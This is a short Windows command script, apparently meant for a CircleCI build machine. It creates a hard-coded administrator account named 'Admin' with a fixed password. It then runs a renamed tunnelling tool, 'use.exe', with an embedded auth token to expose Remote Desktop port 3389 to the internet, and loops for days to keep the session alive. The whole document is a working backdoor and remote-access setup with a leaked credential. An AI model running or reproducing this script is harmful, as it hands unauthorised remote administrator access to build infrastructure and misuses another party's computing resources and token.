cmd /c net user /add Admin P@ssw0rd.
cmd /c net localgroup /add administrators Admin

cmd /c use.exe authtoken 2cn87V9NMzmnYMwO3Vgp6rtvFde_3PkxAeYd8zjbLwMge7LAe
cmd /c use.exe tcp 3389 --log=stdout > C:\Users\circleci\Downloads\use.log

$i = 10000000
do {
    Write-Host $i
    Sleep 120
    $i--
} while ($i -gt 0)
